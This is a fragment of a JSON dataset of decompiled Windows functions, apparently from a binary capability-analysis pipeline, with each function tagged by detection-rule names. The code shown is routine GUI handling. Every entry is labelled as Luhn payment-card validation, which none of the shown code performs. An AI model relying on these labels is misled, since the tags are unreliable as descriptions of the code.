uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 399
    },
    "00444824": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00444824(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack28 = 0x444839;\n    cVar1 = fcn.004447cc(&stack0xfffffffc);\n    if (cVar1 != '\\0') {\n        fcn.00404620();\n        uStack28 = 0x44489e;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        fcn.0044467c(&stack0xfffffffc);\n        fcn.0044467c(&stack0xfffffffc);\n        fcn.0044467c(&stack0xfffffffc);\n        fcn.0044467c(&stack0xfffffffc);\n        fcn.0044467c(&stack0xfffffffc);\n        *in_FS_OFFSET = uStack32;\n        uStack28 = 0x44489d;\n        fcn.00404650();\n        return;\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "00445488": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00445488(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t var_4h;\n    \n    iVar1 = sub.user32.dll_GetWindow(arg_8h, 4);\n    if ((iVar1 == 0) || (iVar1 == *(*0x497c1c + 0x30))) {\n        var_4h = 0;\n    }\n    else {\n        func_0x00408280(iVar1, &var_4h);\n    }\n    iVar2 = sub.kernel32.dll_GetCurrentProcessId();\n    if (iVar2 == var_4h) {\n        iVar2 = fcn.004198e4();\n        if (iVar2 < 0) {\n            fcn.00419730();\n        }\n    }\n    if ((((iVar1 != 0) && (arg_8h != *(*0x497c1c + 0x30))) && (iVar1 == *(*0x497c1c + 0x30))) && (arg_8h != arg_ch)) {\n        iVar1 = sub.user32.dll_IsWindowVisible(arg_8h);\n        if (iVar1 != 0) {\n            iVar1 = fcn.0040676c();\n            fcn.00406928(iVar1 + 1);\n            iVar1 = fcn.0040676c();\n            *(*0x497c40 + -4 + iVar1 * 4) = arg_8h;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 344
    },
    "004457f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004457f0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint lpPaint;\n    \n    uVar1 = sub.user32.dll_BeginPaint(*(*(arg_8h + -4) + 0x30), &lpPaint);\n    uVar2 = fcn.00445ee4();\n    sub.user32.dll_DrawIcon(uVar1, 0, 0, uVar2);\n    sub.user32.dll_EndPaint(*(*(arg_8h + -4) + 0x30), &lpPaint);\n    return;\n}\n",
        "token_count": 134
    },
    "00446264": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00446264(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uchar *puStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    uVar4 = 0;\n    if ((0xff < param_2[1]) && (param_2[1] < 0x10a)) {\n        puStack28 = 0x44628f;\n        iVar2 = sub.user32.dll_GetCapture();\n        if (iVar2 == 0) {\n            iVar2 = *param_2;\n            if ((*(in_EAX + 0x44) == 0) || (iVar2 != *(*(in_EAX + 0x44) + 0x29c))) {\n                while( true ) {\n                    puStack28 = 0x4462be;\n                    cVar1 = fcn.0044d2c0();\n                    if ((cVar1 != '\\0') || (iVar2 == 0)) break;\n                    iStack24 = iVar2;\n                    iVar2 = sub.user32.dll_GetParent();\n                }\n                if (iVar2 == 0) {\n                    iVar2 = *param_2;\n                }\n            }\n            else {\n                puStack28 = 0x4462ab;\n                iVar2 = fcn.00458568();\n            }\n            puStack28 = iVar2;\n            iVar3 = sub.user32.dll_IsWindowUnicode();\n            if (iVar3 == 0) {\n                iVar2 = func_0x00408408(iVar2, param_2[1] + 0xbc00, param_2[2], param_2[3]);\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n            else {\n                iStack24 = iVar2;\n                iVar2 = sub.user32.dll_SendMessageW();\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n        }\n        else {\n            puStack28 = &stack0xffffffe8;\n            func_0x00408280(iVar2);\n            uVar5 = *(in_EAX + 0x30);\n            func_0x00408280(uVar5, &stack0xffffffe4);\n            if (iStack24 == iStack20) {\n                puStack28 = param_2[3];\n                iStack24 = iVar2;\n                iVar2 = sub.user32.dll_SendMessageA(uVar5, param_2[1] + 0xbc00, param_2[2]);\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n        }\n    }\n    return CONCAT44(iStack20, uVar4);\n}\n",
        "token_count": 634
    },
    "004465a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004465a8(void)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00446494();\n    if (cVar1 == '\\0') {\n        fcn.00446e4c();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "004466b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.004466b8(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    uint8_t uStack520;\n    \n    uVar1 = fcn.00404528();\n    while (uVar2 = uVar1,  uVar1 != 0) {\n        fcn.00404530();\n        fcn.00404530();\n        bVar3 = uStack520 == 0xffffffff;\n        uVar2 = fcn.00403a4c();\n        if (bVar3) break;\n        uVar1 = fcn.004045dc();\n    }\n    return uVar2 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 162
    },
    "00446dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00446dc0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar auStack12 [8];\n    \n    sub.user32.dll_GetCursorPos(auStack12);\n    iVar1 = fcn.0044ed7c();\n    if (iVar1 != *(in_EAX + 0x48)) {\n        *(in_EAX + 0x48) = iVar1;\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00447368": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00447368(void)\n\n{\n    int32_t in_EAX;\n    uchar auStack12 [8];\n    \n    fcn.00447220();\n    if (*(in_EAX + 0x89) == '\\0') {\n        sub.user32.dll_GetCursorPos(auStack12);\n        fcn.004476b4();\n    }\n    else if (*(in_EAX + 0x89) == '\\x01') {\n        fcn.004473a0();\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "00447fd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00447fd8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = param_1;\n    *(in_EAX + 0xc) = 0;\n    *(in_EAX + 0x10) = 0;\n    *(in_EAX + 0x14) = 0;\n    *(in_EAX + 0x18) = 0;\n    *(in_EAX + 0x28) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 237
    },
    "004485b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.004485b8(void)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint var_18h;\n    uint hdc;\n    int32_t var_4h;\n    \n    uStack36 = 0;\n    puStack40 = 0x4485c9;\n    var_4h = in_EAX;\n    hdc = sub.user32.dll_GetDC();\n    uStack44 = 0x448659;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    piVar1 = *(var_4h + 0x50);\n    puStack40 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateCompatibleBitmap(hdc, *(var_4h + 0x34), *(var_4h + 0x30));\n    fcn.0042a544();\n    fcn.00429930();\n    fcn.00424f38();\n    arg_ch = (**(*piVar1 + 0x20))();\n    arg_8h = &fcn.004485b8::var_18h;\n    (**(*piVar1 + 0x2c))();\n    fcn.00418438(arg_8h, arg_ch);\n    fcn.00429930(&fcn.004485b8::var_18h);\n    fcn.004252dc();\n    *in_FS_OFFSET = arg_8h;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x448660);\n    return;\n}\n",
        "token_count": 385
    },
    "0044867c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044867c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = *(in_EAX + 0x34);\n    uStack12 = *(in_EAX + 0x30);\n    puVar1 = &uStack8;\n    sub.comctl32.dll_ImageList_GetIconSize(param_2, puVar1, &uStack12);\n    *(in_EAX + 0x34) = puVar1;\n    *(in_EAX + 0x30) = param_2;\n    fcn.004485b8();\n    return;\n}\n",
        "token_count": 159
    },
    "0044881c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044881c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x448837;\n    fcn.0042935c();\n    uStack36 = 0x4488cb;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x448854;\n    puStack32 = &stack0xfffffffc;\n    fcn.0042935c();\n    uStack48 = 0x4488ae;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.004485ac();\n    uVar1 = fcn.004486f0();\n    uVar2 = fcn.004486f0(uVar1);\n    uVar1 = *(in_EAX + 0x3c);\n    sub.comctl32.dll_ImageList_Add(uVar1, uVar2);\n    *in_FS_OFFSET = uVar1;\n    fcn.00404650(0x4488b5);\n    return;\n}\n",
        "token_count": 334
    },
    "00449118": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00449118(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != NULL) {\n        puStack32 = 0x449130;\n        iVar1 = fcn.004488e8();\n        puStack32 = 0x449139;\n        iVar2 = fcn.004488e8();\n        if (iVar1 == iVar2) {\n            puStack32 = 0x44914d;\n            iVar1 = fcn.004488e8();\n            if (iVar1 != 0) {\ncode_r0x00449165:\n                puStack32 = 0x449171;\n                fcn.00404620();\n                uStack36 = 0x4491f4;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack44 = 0x44918c;\n                puStack32 = &fcn.00449118::var_1h + 1;\n                (**(*in_EAX + 0x3c))();\n                puStack44 = 0x449198;\n                fcn.00404620();\n                uStack48 = 0x4491d7;\n                uStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                puStack44 = &fcn.00449118::var_1h + 1;\n                (**(*param_2 + 0x3c))();\n                var_1h._0_1_ = fcn.004490d4();\n                *in_FS_OFFSET = uStack52;\n                puStack44 = 0x4491de;\n                uStack48 = 0x4491d6;\n                uVar3 = fcn.00404650();\n                return uVar3;\n            }\n            puStack32 = 0x449158;\n            iVar1 = fcn.004488e8();\n            if (iVar1 != 0) goto code_r0x00449165;\n            var_1h._0_1_ = 1;\n            goto code_r0x004491fb;\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x004491fb:\n    return var_1h;\n}\n",
        "token_count": 618
    },
    "00449264": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449264(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004202d4();\n    uVar2 = *(*in_EAX + 0x38);\n    uVar1 = *(*in_EAX + 0x3c);\n    piVar3 = in_EAX;\n    fcn.00449208(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1, in_EAX, uVar2, piVar3);\n    return;\n}\n",
        "token_count": 161
    },
    "00449550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00449550(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY48;\n    uint uStackY44;\n    uchar *puStackY40;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStackY40 = 0x44956f;\n    iVar1 = fcn.00420a60(0);\n    uStackY44 = 0x4495b0;\n    iStackY48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (iVar1 != 0) {\n        iVar1 = iVar1 + 0x14;\n    }\n    puStackY40 = &stack0xfffffffc;\n    sub.comctl32.dll_ImageList_Read();\n    fcn.004486b4();\n    *in_FS_OFFSET = iVar1;\n    uStackY44 = 0x4495b7;\n    iStackY48 = 0x4495af;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 239
    },
    "0044a128": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044a128(code *arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(*(in_EAX + 0x30) + 8);\n    if (-1 < iVar1 + -1) {\n        iVar2 = 0;\n        do {\n            if (*(*(*(*(in_EAX + 0x30) + 4) + iVar2 * 4) + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar2 = iVar2 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "0044a568": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0044a568(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00420868();\n    *(in_EAX + 0x6a) = 1;\n    *(in_EAX + 0x80) = 0xffffffff;\n    *(in_EAX + 0x86) = 1;\n    *(in_EAX + 0x90) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 194
    },
    "0044d120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044d120(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    *(*0x490650 + 0x1b4) = arg_8h;\n    iVar1 = sub.user32.dll_IsWindowUnicode(arg_8h);\n    if (iVar1 == 0) {\n        sub.user32.dll_SetWindowLongA(arg_8h, 0xfffffffc, *(*0x490650 + 0x1c0));\n        uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xfffffff0);\n        if ((uVar2 & 0x40000000) != 0) {\n            iVar1 = sub.user32.dll_GetWindowLongA(arg_8h, 0xfffffff4);\n            if (iVar1 == 0) {\n                sub.user32.dll_SetWindowLongA(arg_8h, 0xfffffff4, arg_8h);\n            }\n        }\n    }\n    else {\n        sub.user32.dll_SetWindowLongW(arg_8h, 0xfffffffc, *(*0x490650 + 0x1c0));\n        uVar2 = sub.user32.dll_GetWindowLongW(arg_8h, 0xfffffff0);\n        if ((uVar2 & 0x40000000) != 0) {\n            iVar1 = sub.user32.dll_GetWindowLongW(arg_8h, 0xfffffff4);\n            if (iVar1 == 0) {\n                sub.user32.dll_SetWindowLongW(arg_8h, 0xfffffff4, arg_8h);\n            }\n        }\n    }\n    sub.user32.dll_SetPropA(arg_8h, *0x497c72, *0x490650);\n    sub.user32.dll_SetPropA(arg_8h, *0x497c70, *0x490650);\n    iVar1 = *0x490650;\n    *0x490650 = 0;\n    uVar3 = (**(iVar1 + 0x1c0))(arg_8h, arg_ch, arg_10h, arg_14h);\n    return uVar3;\n}\n",
        "token_count": 504
    },
    "0044d55c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044d55c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar auStack16 [8];\n    \n    puVar3 = auStack16;\n    iVar1 = param_2;\n    sub.gdi32.dll_GetWindowOrgEx(param_2, auStack16);\n    iVar2 = param_2;\n    sub.gdi32.dll_SetWindowOrgEx(param_2, iVar1 + *(in_EAX + 0x40), puVar3 + *(in_EAX + 0x44), 0);\n    iVar1 = param_2;\n    fcn.00451abc(param_2);\n    sub.gdi32.dll_SetWindowOrgEx(param_2, iVar1, iVar2, 0);\n    return;\n}\n",
        "token_count": 196
    },
    "0044d6e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044d6e8(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = fcn.00402f00();\n    *puVar2 = param_2;\n    uVar3 = fcn.0044d6bc(&stack0xfffffffc);\n    puVar2[1] = uVar3;\n    cVar1 = fcn.0044d684();\n    if (cVar1 == '\\0') {\n        fcn.00419730();\n    }\n    else {\n        fcn.00419888();\n        uVar3 = fcn.00458568();\n        uVar3 = fcn.00458568(uVar3);\n        sub.user32.dll_IsChild(uVar3);\n        fcn.00419904();\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "0044da68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044da68(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x40) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "0044ed7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0044ed7c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_8h;\n    uint arg_ch;\n    \n    arg_ch = 0x44ed90;\n    iVar1 = fcn.0044ed48();\n    iVar3 = 0;\n    if (iVar1 != 0) {\n        arg_ch = 0;\n        arg_8h = 0;\n        fcn.00450344();\n        iVar2 = fcn.004553a0(arg_8h, arg_ch);\n        iVar3 = iVar1;\n        if (iVar2 != 0) {\n            iVar3 = iVar2;\n        }\n    }\n    return CONCAT44(arg_ch, iVar3);\n}\n",
        "token_count": 169
    },
    "0044ee10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044ee10(void)\n\n{\n    sub.gdi32.dll_GetWindowOrgEx();\n    sub.gdi32.dll_SetWindowOrgEx();\n    return;\n}\n",
        "token_count": 38
    },
    "0044ee40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044ee40(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack24 = 0x44ee50;\n    var_8h = fcn.00419bf8();\n    uStack28 = 0x44eef0;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (-1 < *(var_8h + 8) + -1) {\n        var_4h = 0;\n        puStack24 = &stack0xfffffffc;\n        var_ch = *(var_8h + 8);\n        do {\n            puStack36 = 0x44ee82;\n            var_10h = fcn.00419888();\n            puStack36 = 0x44ee8d;\n            cVar1 = fcn.0042552c();\n            if (cVar1 != '\\0') {\n                uStack40 = 0x44eec9;\n                uStack44 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd4;\n                puStack36 = &stack0xfffffffc;\n                fcn.0044f07c();\n                fcn.00404f70();\n                fcn.00404f70();\n                return;\n            }\n            var_4h = var_4h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x44eef7;\n    uStack28 = 0x44eeef;\n    fcn.00419c5c();\n    return;\n}\n",
        "token_count": 439
    },
    "0044f0f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0044f0f4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 165
    },
    "0044f764": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044f764(void)\n\n{\n    int32_t *arg_8h;\n    char extraout_DL;\n    \n    arg_8h = fcn.00404a1c();\n    fcn.004451cc();\n    if ((arg_8h[0x25] == 0) || ((*(arg_8h[0x25] + 0x1c) & 8) != 0)) {\n        (**(*arg_8h + 0x6c))();\n    }\n    else {\n        fcn.00420258();\n        fcn.00451abc(arg_8h);\n        (**(*arg_8h + 0x6c))();\n        fcn.00450124();\n        fcn.0040484c();\n        arg_8h[0x25] = 0;\n    }\n    fcn.00404650();\n    arg_8h[0x1b] = 0;\n    fcn.00404650();\n    fcn.00404650();\n    fcn.0040aaf8();\n    fcn.00404650();\n    fcn.0041ff90();\n    if ('\\0' < extraout_DL) {\n        fcn.004049c4();\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "00450124": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450124(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    *param_2 = *(in_EAX + 0x40);\n    param_2[1] = *(in_EAX + 0x44);\n    param_2[2] = *(in_EAX + 0x40) + *(in_EAX + 0x48);\n    param_2[3] = *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n    return;\n}\n",
        "token_count": 128
    },
    "00450180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00450180(void)\n\n{\n    int32_t *in_EAX;\n    uint uStack12;\n    \n    (**(*in_EAX + 0x44))();\n    return uStack12;\n}\n",
        "token_count": 47
    },
    "00450198": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00450198(void)\n\n{\n    fcn.004501c4();\n    fcn.00418410();\n    fcn.00450690();\n    return;\n}\n",
        "token_count": 40
    },
    "004501c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004501c4(void)\n\n{\n    int32_t *in_EAX;\n    uint uStack8;\n    \n    (**(*in_EAX + 0x44))();\n    return uStack8;\n}\n",
        "token_count": 48
    },
    "004501dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004501dc(void)\n\n{\n    fcn.00450180();\n    fcn.00418410();\n    fcn.00450690();\n    return;\n}\n",
        "token_count": 39
    },
    "00450294": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450294(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    (**(*in_EAX + 0x40))();\n    *param_1 = *param_2 + iStack20;\n    param_1[1] = param_2[1] + iStack16;\n    return;\n}\n",
        "token_count": 104
    },
    "00450344": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450344(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    (**(*in_EAX + 0x40))();\n    *param_1 = *param_2 - iStack20;\n    param_1[1] = param_2[1] - iStack16;\n    return;\n}\n",
        "token_count": 104
    },
    "00450690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450690(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    iVar1 = *param_2;\n    iVar2 = param_2[1];\n    (**(*in_EAX + 0x44))(iVar1, iVar2);\n    (**(*in_EAX + 0x88))((in_EAX[0x13] - iStack16) + iVar2, (in_EAX[0x12] - iStack20) + iVar1);\n    return;\n}\n",
        "token_count": 153
    },
    "004517e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar __fastcall fcn.004517e4(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uchar *arg_8h;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uchar auStack28 [16];\n    \n    uVar3 = *param_2;\n    uVar4 = param_2[1];\n    uVar5 = param_2[2];\n    uVar6 = param_2[3];\n    if (*(in_EAX + 0x94) != 0) {\n        cVar1 = fcn.0040484c(uVar3, uVar4, uVar5, uVar6);\n        if (cVar1 == '\\0') {\n            cVar1 = '\\0';\n            goto code_r0x00451818;\n        }\n    }\n    cVar1 = '\\x01';\ncode_r0x00451818:\n    if (cVar1 != '\\0') {\n        iVar2 = fcn.00452c0c();\n        if (iVar2 == 0) {\n            fcn.0040484c(uVar3, uVar4, uVar5, uVar6);\n        }\n        else {\n            uVar3 = fcn.004501c4();\n            arg_8h = auStack28;\n            fcn.00450180();\n            fcn.00418438(arg_8h, uVar3);\n      